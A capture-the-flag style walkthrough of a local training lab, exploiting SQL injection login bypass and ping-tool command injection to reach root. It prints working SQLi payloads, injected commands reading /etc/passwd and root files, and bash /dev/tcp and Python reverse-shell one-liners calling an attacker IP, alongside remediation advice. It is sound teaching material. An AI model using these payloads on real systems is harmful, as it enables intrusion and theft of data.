# VULNLAB — Full Walkthrough (SPOILERS)

This document walks through every vulnerability in the lab, from recon to root.
If you want to solve it yourself, stop reading now.

---

## Phase 0 — Recon

Start the server and browse to it:

```
http://127.0.0.1:8000
```

The landing page advertises three challenges: a login panel, a network tool,
and an admin panel. Note the endpoints:

- `/login`        — authentication
- `/tools/ping`   — network connectivity tool
- `/admin`        — restricted, returns **403** until you're admin
- `/api/whoami`   — leaks server info

Try `/admin` directly: you get **403 Access Denied**. So we need the admin role.

---

## Phase 1 — SQL Injection (authentication bypass)

Go to `/login`. The page shows the exact SQL query the server runs after you
submit, which makes the injection point obvious:

```sql
SELECT * FROM users WHERE username = '<user>' AND password = '<pass>'
```

The classic bypass is to make the `WHERE` clause always true and comment out
the rest of the query.

**Payload (username field):**

```
' OR '1'='1' -- -
```

Password can be left blank. The resulting query becomes:

```sql
SELECT * FROM users WHERE username = '' OR '1'='1' -- -' AND password = ''
```

`'1'='1'` is always true, and `-- -` comments out the trailing password check.
The first row returned is `admin`, so you are logged in **as admin**.

Other working variants:

```
' OR 1=1 -- -
admin' -- -
' OR '1'='1' /*
```

### Verify

After login you land on `/dashboard` with "Welcome, admin". Now visit `/admin`
and the flag is revealed:

```
FLAG{sql1_2_cmd1_2_r00t_1s_y0urs}
```

> **Why it works:** the app builds SQL with string concatenation
> (`"SELECT ... '%s' ..." % (username, password)`) instead of parameterised
> queries. User input is treated as SQL code.
>
> **The fix:** use parameterised queries / prepared statements, e.g.
> `conn.execute("SELECT * FROM users WHERE username=? AND password=?", (u, p))`.

---

## Phase 2 — OS Command Injection (RCE)

Go to `/tools/ping`. Enter `127.0.0.1` and submit — it runs `ping -c 2 127.0.0.1`
on the server and shows the output. The page also prints the exact command,
revealing the injection point:

```
ping -c 2 <your input>
```

Because the input is concatenated into a shell command run with `shell=True`,
any shell metacharacter lets you run your own commands.

**Basic proof:**

```
127.0.0.1; id
```

Output includes:

```
uid=0(root) gid=0(root) groups=0(root)
```

Other useful payloads:

```
127.0.0.1 && whoami
127.0.0.1 | id
127.0.0.1; uname -a
127.0.0.1; cat /etc/passwd
127.0.0.1; ls -la /root
127.0.0.1; cat /root/root.txt
```

Reading the loot file:

```
FLAG{r00t_v1a_c0mm4nd_1nj3ct10n}
```

> **Why it works:** `subprocess.run("ping -c 2 " + host, shell=True)` hands the
> whole string to `/bin/sh`, so `;`, `&&`, `|`, `$()` etc. start new commands.
>
> **The fix:** never pass user input to a shell. Use an argument list with
> `shell=False` and validate the host against a strict allow-list (e.g. a regex
> for IP/hostname), e.g.
> `subprocess.run(["ping", "-c", "2", host], shell=False)`.

---

## Phase 3 — Reverse Shell (interactive RCE)

Now turn the command injection into an interactive shell.

### 3a. Start a listener on YOUR machine

On your attacker box (Kali, or the same host for a local test):

```bash
nc -lvnp 4444
```

(Helper: `./exploits/listener.sh 4444`)

### 3b. Fire the payload from `/tools/ping`

Set `LHOST` to your attacker IP and `LPORT` to the listener port.

**Important:** on Debian the web app's `/bin/sh` is `dash`, which does **not**
support `/dev/tcp`. So you must invoke `bash` explicitly and let *bash* do the
redirection:

```
127.0.0.1; bash -c 'bash -i >& /dev/tcp/LHOST/4444 0>&1'
```

Example (attacker at 10.10.14.5):

```
127.0.0.1; bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
```

Your listener pops:

```
connect to [10.10.14.5] from (UNKNOWN) [10.10.14.20] 51234
bash: cannot set terminal process group: Inappropriate ioctl for device
bash: no job control in this shell
root@target:/workspace/vuln-lab#
```

You now have a root shell. Try `id`, `hostname -I`, `cat /root/root.txt`.

### 3c. One-shot (non-interactive) variant

If you only want command output piped back:

```
127.0.0.1; bash -c '{ id; uname -a; cat /root/root.txt; } > /dev/tcp/LHOST/4444'
```

### 3d. Python fallback

If bash/`/dev/tcp` is unavailable:

```
127.0.0.1; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("LHOST",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh","-i"])'
```

### 3e. Upgrade to a fully interactive TTY (optional)

Once you have the shell, make it usable:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# then press Ctrl+Z
stty raw -echo; fg
# press Enter twice, then:
export TERM=xterm
```

---

## Phase 4 — Post-exploitation / loot

```
id                 -> uid=0(root)
whoami             -> root
uname -a           -> Linux ... x86_64
hostname -I        -> server IP
cat /root/root.txt -> FLAG{r00t_v1a_c0mm4nd_1nj3ct10n}
```

---

## Summary of flags

| Flag | Location | How |
|------|----------|-----|
| `FLAG{sql1_2_cmd1_2_r00t_1s_y0urs}` | `/admin` | SQLi login bypass |
| `FLAG{r00t_v1a_c0mm4nd_1nj3ct10n}` | `/root/root.txt` | Command injection -> shell |

---

## Remediation checklist

1. **Parameterised queries** for all database access (kill SQLi).
2. **No shell** for external commands; use argument arrays + `shell=False`,
   and validate input with a strict allow-list (kill command injection).
3. **Least privilege**: run the web app as an unprivileged user, not root.
4. **Never leak** SQL errors or executed commands to the client.
5. **Secrets** out of source code (use environment variables / a vault).
6. **Network isolation** for lab apps; never expose to the internet.
